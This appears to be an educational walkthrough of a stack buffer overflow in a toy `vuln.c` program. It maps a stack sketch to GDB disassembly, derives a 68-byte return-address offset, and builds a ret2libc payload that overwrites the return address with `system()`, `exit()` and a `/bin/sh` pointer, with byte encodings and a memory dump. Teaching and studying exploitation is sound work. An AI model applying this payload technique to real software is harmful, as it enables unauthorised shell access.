```text
BUFFER (64 BYTES) <-- ESP
EBP
RET ADDR (PRINTF("Done.\n"))
ARGV[1]
EBP <-- EBP
RET ADDR
ARGC
ARGV
```

# Mapping This Stack Sketch to `vuln.c`

Read the supplied sketch from top to bottom. At the breakpoint after `strcpy`, ESP points to the buffer at the top; each following stack slot is at a higher numeric address. The labels map to this build as follows:

- The first `EBP` line is the saved EBP slot in `vuln`'s frame. It contains `main`'s EBP value; `vuln`'s EBP register points to this slot.
- `RET ADDR (PRINTF("Done.\\n"))` is shorthand for the return path: `vuln` returns to the instruction after `call vuln` in `main`, and `main` then prints `Done.`
- `ARGV[1]` is the `input` argument to `vuln`, which points to the command-line string. `strcpy` copies the string's bytes into `BUFFER`.
- `EBP <-- EBP` is `main`'s saved EBP slot, with `main`'s EBP pointing to it.
- The final `RET ADDR`, `ARGC`, and `ARGV` are `main`'s frame entries in that order. In this 32-bit build, they are at `[EBP_m+4]`, `[EBP_m+8]`, and `[EBP_m+12]` respectively.

In this drawing, “top” describes where the buffer is shown and where ESP points at the breakpoint. “Higher numeric address” describes the address of later entries as you move down the sketch. Both descriptions are true at the same time.

## The source being pictured

```c
void vuln(char *input)
{
    char buffer[64];
    strcpy(buffer, input);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("usage: %s <input>\n", argv[0]);
        return 1;
    }
    printf("Running...\n");
    vuln(argv[1]);
    printf("Done.\n");
    return 0;
}
```

`main` receives the argument count `argc` and the argument-vector pointer `argv`. `argv[1]` is a pointer to the command-line string. The call `vuln(argv[1])` passes that pointer as the parameter named `input`. Inside `vuln`, `strcpy` copies the bytes from the string into `buffer`; it does not copy the pointer value as the buffer contents.

## Read the sketch from `vuln` outward

For this build, the start of `vuln` disassembles as:

```asm
push ebp
mov  ebp,esp
sub  esp,0x40
```

At function entry, the caller's `call vuln` has already pushed a return address. `push ebp` saves `main`'s EBP value, then `mov ebp,esp` makes EBP point to that saved value. The `sub esp,0x40` reserves 64 bytes for `buffer`.

The GEF breakpoint is at the `nop` immediately after `strcpy` and its argument cleanup. At that point in this build, ESP points to the first byte of `buffer`. Here is what each line in the supplied sketch represents:

| Supplied line                  | Meaning in this program                                                                                                                                                                                                                                              |
| ------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `BUFFER (64 BYTES) <-- ESP`    | `buffer` occupies 64 bytes from `[EBP_v-0x40]` through `[EBP_v-1]`. At the post-copy breakpoint, ESP points at its first byte, `[EBP_v-0x40]`. `EBP_v` means EBP while `vuln` is active.                                                                             |
| `EBP`                          | The saved EBP word at `[EBP_v]`. It contains the value of `main`'s EBP, saved by `vuln`'s `push ebp`.                                                                                                                                                                |
| `RET ADDR (PRINTF("Done.\n"))` | The saved return address at `[EBP_v+4]`. It points to the instruction in `main` immediately after `call vuln`; that code proceeds to print `Done.`. The return address is not itself the address of `printf`.                                                        |
| `ARGV[1]`                      | The `input` parameter at `[EBP_v+8]`, whose value is a pointer to the string `argv[1]`. This is a pointer slot, not the characters of the string.                                                                                                                    |
| `EBP <-- EBP`                  | Read this as the next frame's EBP and the EBP register pointing at its saved-EBP slot. In this compiled `main`, `EBP_m` is 12 bytes above `EBP_v`, so the slot `[EBP_m]` is `[EBP_v+12]`. This is not two extra EBP words. `EBP_m` means EBP while `main` is active. |
| `RET ADDR`                     | `main`'s own saved return address, at `[EBP_m+4]`, which returns from `main` to its caller in the C runtime. This is different from `vuln`'s saved return address.                                                                                                   |
| `ARGC`                         | `main`'s `argc` parameter. In a conventional 32-bit frame it is at `[EBP_m+8]`.                                                                                                                                                                                      |
| `ARGV`                         | `main`'s `argv` parameter. In a conventional 32-bit frame it is at `[EBP_m+12]`.                                                                                                                                                                                     |

### Where the `Done` return path goes

The parenthetical `PRINTF("Done.\n")` describes what happens after `vuln` returns, not the exact saved return address. In the tested binary, `main` calls `vuln` at `0x080491d7`; the saved return address is `0x080491dc`, the next instruction. That instruction cleans up the argument, then `main` reaches the `Done` output. The compiler turns `printf("Done.\n")` into `puts` in this build, so the disassembly shows a call to `puts@plt`, even though the C source says `printf`.

## Map the disassembly onto the sketch

In GDB, `disas vuln` showed this function body:

```asm
0x08049186 <+0>:  push ebp
0x08049187 <+1>:  mov  ebp,esp
0x08049189 <+3>:  sub  esp,0x40
0x0804918c <+6>:  push DWORD PTR [ebp+0x8]
0x0804918f <+9>:  lea  eax,[ebp-0x40]
0x08049192 <+12>: push eax
0x08049193 <+13>: call strcpy@plt
0x08049198 <+18>: add  esp,0x8
0x0804919b <+21>: nop
0x0804919c <+22>: leave
0x0804919d <+23>: ret
```

Read this alongside the supplied sketch at the top of the document:

| Disassembly instruction    | What it does                                                                                                | Corresponding sketch entry                                                                                       |
| -------------------------- | ----------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| `push ebp`                 | Pushes `main`'s current EBP value onto the stack.                                                           | Creates the saved `EBP` word in `vuln`'s frame.                                                                  |
| `mov ebp,esp`              | Makes EBP point to the saved-EBP word just pushed.                                                          | The `EBP <-- EBP` relationship: EBP is a register containing the address of the saved-EBP slot.                  |
| `sub esp,0x40`             | Subtracts `0x40` (64) from ESP, giving ESP a lower numeric address.                                         | Reserves the `BUFFER (64 BYTES)` area; at the breakpoint ESP points to its first byte at the top of your sketch. |
| `push DWORD PTR [ebp+0x8]` | Pushes `vuln`'s `input` pointer as the second C argument, `strcpy`'s source.                                | Reads the `ARGV[1]` pointer slot in the ordinary call frame.                                                     |
| `lea eax,[ebp-0x40]`       | Computes the address of the first byte of `buffer`; it does not read the buffer's contents.                 | The beginning of `BUFFER`.                                                                                       |
| `push eax`                 | Pushes the buffer address as `strcpy`'s first C argument, the destination.                                  | Passes the buffer address to `strcpy`.                                                                           |
| `call strcpy@plt`          | Temporarily pushes a return address for the call to `strcpy`, then copies the input string into the buffer. | Writes the bytes that overflow the buffer and subsequent stack slots.                                            |
| `add esp,0x8`              | Discards the two 4-byte `strcpy` arguments after the function returns.                                      | Restores ESP to the start of `BUFFER`; this is why `$esp` points there at the `nop` breakpoint.                  |
| `nop`                      | Does nothing; the breakpoint is placed here after the copy.                                                 | Moment to inspect the sketch's stack slots before `vuln` returns.                                                |
| `leave`                    | Equivalent to `mov esp,ebp` followed by `pop ebp`.                                                          | Uses the saved-EBP slot. With the overflow, that slot contains four `A` bytes.                                   |
| `ret`                      | Pops the next word from the stack into the instruction pointer.                                             | Uses the overwritten `RET ADDR` word; in the payload, that word is `system()`.                                   |

### Where `vuln`'s return address comes from

The caller's relevant `main` instructions were:

```asm
0x080491ce: mov  eax,DWORD PTR [ebp+0xc]
0x080491d1: add  eax,0x4
0x080491d4: mov  eax,DWORD PTR [eax]
0x080491d6: push eax
0x080491d7: call vuln
0x080491dc: add  esp,0x4
0x080491df: push 0x0804a026
0x080491e4: call puts@plt
```

The first three instructions get the `argv[1]` pointer: `[ebp+0xc]` loads `main`'s `argv`, adding 4 bytes advances from `argv[0]` to `argv[1]`, and the next `mov` loads that entry (the pointer to the input string). `push eax` passes that pointer to `vuln`.

The `call vuln` at `0x080491d7` pushes `0x080491dc` onto the stack as `vuln`'s saved return address. That is the address of the next instruction, `add esp,0x4`, not the address of `printf`/`puts`. After returning, `main` cleans up the argument, pushes the `Done` string, and calls `puts@plt`. This is the exact meaning of the sketch's `RET ADDR (PRINTF("Done.\\n"))` label: it describes the eventual path, not the literal saved address.

For this compiled version, `main`'s EBP is 12 bytes above `vuln`'s EBP: `main` pushes the `vuln` argument (4 bytes), `call vuln` pushes the return address (4 bytes), and `vuln`'s `push ebp` saves `main`'s EBP (4 bytes). Thus `EBP_m = EBP_v + 12`, matching the `EBP <-- EBP` and following entries in the supplied sketch.

### What `leave; ret` do with the payload

At the breakpoint after `strcpy`, the saved EBP at `[EBP_v]` has been overwritten by the last four padding bytes (`0x41414141`), and `[EBP_v+4]` contains the `system()` address. When execution reaches `leave`, it sets ESP back to EBP and pops `0x41414141` into EBP. The following `ret` pops `system()` into the instruction pointer. ESP then points at the next payload word, `exit()`, and the word after that is the `/bin/sh` argument. This is how the three payload words line up with the slots in the sketch.

## Why the return-address offset is 68 bytes

Use the first four lines of the supplied sketch: buffer, saved EBP, saved return address, then the input-argument slot. In the disassembly, the buffer begins at `EBP_v-0x40`; the saved EBP is at `EBP_v`; and `vuln`'s return address is at `EBP_v+4`.

Calculate the distance from the buffer's first byte to the saved return address:

```text
(EBP_v + 4) - (EBP_v - 0x40)
= 0x44 bytes
= 68 bytes
```

That is why this build's payload starts with 68 `A` bytes. The first 64 `A`s fill `buffer`; the next 4 overwrite the saved EBP; the next 4 bytes occupy the saved return-address slot. The payload builder must therefore use `OFFSET = 68` for this exact compile.

## How the payload changes those stack slots

With the addresses from the verified GDB run, the builder makes 68 padding bytes followed by:

```text
system() address: 0xf7dc8ce0 -> bytes e0 8c dc f7
exit() address:   0xf7db52b0 -> bytes b0 52 db f7
"/bin/sh" address:0xf7f40167 -> bytes 67 01 f4 f7
```

Those words replace slots in the supplied sketch as follows:

| Offset from buffer start | Sketch slot            | Payload value          | Purpose after `vuln` returns                     |
| -----------------------: | ---------------------- | ---------------------- | ------------------------------------------------ |
|             0 through 63 | `BUFFER (64 BYTES)`    | 64 `A` bytes           | Fills the local buffer.                          |
|            64 through 67 | first `EBP`            | 4 `A` bytes            | Overwrites the saved EBP.                        |
|            68 through 71 | `RET ADDR` in `vuln`   | `system()`             | `vuln`'s `ret` transfers control to `system`.    |
|            72 through 75 | `ARGV[1]` slot         | `exit()`               | `system` treats this word as its return address. |
|            76 through 79 | next caller stack word | pointer to `"/bin/sh"` | `system` treats this word as its argument.       |

The original `argv[1]` pointer slot is overwritten by the `exit()` word. That is expected: after `vuln` returns to `system`, the stack is being interpreted according to `system`'s calling convention, not as the original `vuln` call frame.

## Verify the sketch in GDB

At the breakpoint after `strcpy`, inspect the frame pointer and the words it identifies:

```gdb
x/wx $ebp
x/wx $ebp+4
x/wx $ebp+8
```

`x/wx ADDRESS` means examine one 4-byte word (`w`) and display it in hexadecimal (`x`). In the harmless `run AAAA` case:

- `$ebp` is the saved EBP slot.
- `$ebp+4` is the saved return address into `main`.
- `$ebp+8` is the `input` pointer argument.

Then use the payload run and inspect the buffer from ESP:

```gdb
x/32xw $esp
```

`x/32xw` displays 32 four-byte words in hexadecimal. In the verified payload dump, the first 17 words are `0x41414141` (68 `A` bytes), followed by `0xf7dc8ce0`, `0xf7db52b0`, and `0xf7f40167`. Those are the `system`, `exit`, and `/bin/sh` words at offsets 68, 72, and 76.

The absolute stack addresses such as `0xffffcf8c` vary by run. The offsets from ESP and the relationship between the saved frame pointer and return address are what matter for understanding the sketch.
